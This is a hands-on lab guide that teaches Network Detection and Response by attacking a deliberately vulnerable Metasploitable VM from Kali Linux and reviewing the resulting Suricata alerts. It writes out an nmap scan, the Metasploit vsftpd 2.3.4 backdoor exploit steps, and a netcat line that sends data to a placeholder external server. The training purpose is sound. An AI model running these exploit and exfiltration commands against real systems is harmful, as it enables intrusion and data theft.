# Exploring Network Detection and Response (NDR) with Kali Linux and Metasploitable

## Objective

The purpose of this lab is to provide hands-on experience with Network Detection and Response (NDR) solutions by simulating real-world attacks using Kali Linux and Metasploitable. Participants will learn how to identify vulnerabilities, exploit them, and analyze how an NDR system detects and responds to malicious activities within a network.

## Prerequisites
- Basic understanding of network security concepts.
- Familiarity with penetration testing tools (e.g., Metasploit).
- Access to a virtual lab environment with Hyper-V installed.

## Lab Environment
- Kali Linux: A powerful penetration testing distribution that includes numerous tools for ethical hacking and network security assessments.
- Metasploitable: An intentionally vulnerable Linux distribution designed for testing and training purposes. It allows participants to practice penetration testing techniques.
- NDR Solution (e.g., Suricata or Zeek): An open-source monitoring tool that provides visibility into network traffic, detects anomalies, and can simulate some NDR functionalities.

## Key Learning Outcomes
- Understand the principles of NDR and its importance in modern cybersecurity.
- Gain hands-on experience in reconnaissance, exploitation, and post-exploitation techniques.
- Analyze alerts and logs generated by the NDR solution during simulated attacks.
- Discuss the effectiveness of NDR in detecting and mitigating threats.

## Lab Activities
- Reconnaissance: Use nmap to scan the Metasploitable VM, identifying open ports and services.
- Exploitation: Utilize Metasploit to exploit vulnerabilities in Metasploitable, demonstrating common attack techniques.
- Post-Exploitation: Simulate actions an attacker might take after gaining access, such as privilege escalation and data exfiltration.
- Monitoring and Analysis: Observe and analyze alerts generated by the NDR solution, discussing detection capabilities and incident response.

## Understanding NDR

**What is NDR?**

NDR refers to technologies and processes that monitor network traffic to detect, analyze, and respond to threats in real-time. It emphasizes not just detection but also response strategies.

**Importance of NDR:**

In todayâ€™s threat landscape, traditional perimeter defenses are insufficient. NDR solutions help organizations identify threats that bypass these defenses and respond swiftly to minimize damage.

**How NDR Tools Work**
- **Traffic Analysis:** Tools like Suricata analyze network packets in real-time, looking for signatures of known attacks, anomalies, or unusual behavior.
- **Alert Generation:** When suspicious activity is detected, alerts are generated, providing security teams with actionable insights.
- **Incident Response:** The response can range from automated actions (like blocking an IP) to manual interventions based on alert severity.

## Lab Activities

PG (GNU Privacy Guard) keys are used to digitally sign packages in a Linux distribution's package repository, updating GPG keys is a security best practice that helps ensure the authenticity and integrity of the software packages you download and install on your system.

Run the below command need to be entered manually in terminal to update the GPG keys

```
sudo apt-key adv --refresh-keys --keyserver keyserver.ubuntu.com
```
Next, run the below command to update the list of available packages.

Note: The below command need to be entered manually in terminal.
```
sudo apt-get update
```

**Activity 1: Reconnaissance**
Objective: Identify open ports and services on the Metasploitable VM.

1. Open a terminal in Kali Linux. Run Nmap to scan the Metasploitable VM:
```
nmap -sS -sV -p- <Metasploitable_IP>
```
2. Analyze the output: Look for open ports, the state of each port (open/closed/filtered), and the service/version information.

Running nmap -sS -sV -p- <Metasploitable_IP> provides crucial information about the network services available on the target. This reconnaissance step is vital for ethical hackers and attackers alike, and understanding the implications of the scan output is essential for effective security assessments and incident response strategies.

**Activity 2: Exploitation**
Objective: Exploit vulnerabilities in Metasploitable to simulate an attack,observing how NDR detects these actions.

1.  Open a terminal in Kali Linux.

2.  Launch Metasploit:
``` 
msfconsole
```

2. Search for available exploits for Metasploitable services (e.g., vsftpd):
```
search vsftpd
```

3. Select and configure the exploit:
```
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST <Metasploitable_IP>
exploit
```

4. Verify access by interacting with the session.

**Activity 3: Post-Exploitation Actions**
Objective: Simulate actions an attacker might take after gaining access.

1. Privilege Escalation: Attempt to escalate privileges using techniques. Run the command in Kali Linux
   ```
   sudo -l
   ```
   
3. Data Gathering:
Run commands to gather system information on Metasploitable VM
```
uname -a
whoami
```

3. Simulated Data Exfiltration:
Use a command to send data to a controlled external server (or simply log it):
```
echo "Sensitive Data" | nc <your_external_server_IP> <port>
```

**Activity 4: Monitoring and Analysis**
Objective: Simulate monitoring and analyze alerts related to the activities performed.

1. Install and Run an Open-Source NDR Tool: Install Suricata:
```
sudo apt update
sudo apt install suricata
```

2. Configure Suricata to monitor the appropriate network interface.
   Start Suricata:
```
sudo suricata -c /etc/suricata/suricata.yaml -i eth0
```

3. Review Logs:

Check logs for alerts generated during the reconnaissance, exploitation, and post-exploitation activities:
````
cat /var/log/suricata/fast.log
```

## Discussion and Analysis
Review the types of attacks conducted and how they might be detected by an NDR solution.
Analyze the alerts generated by Suricata or expected alerts from typical NDR systems.
Discuss how the knowledge gained can be applied to enhance network security measures.

## Summary
Kali Linux: This is where you perform reconnaissance, exploitation, and analysis of alerts using tools like Nmap, Metasploit, and Suricata.
Metasploitable: You'll log in here to get the IP address and potentially as a target for the attacks.

## Ethical Considerations
This lab is intended for educational purposes only. Participants are reminded to operate within a controlled environment and adhere to ethical hacking principles. All activities should be performed in compliance with relevant laws and organizational policies.
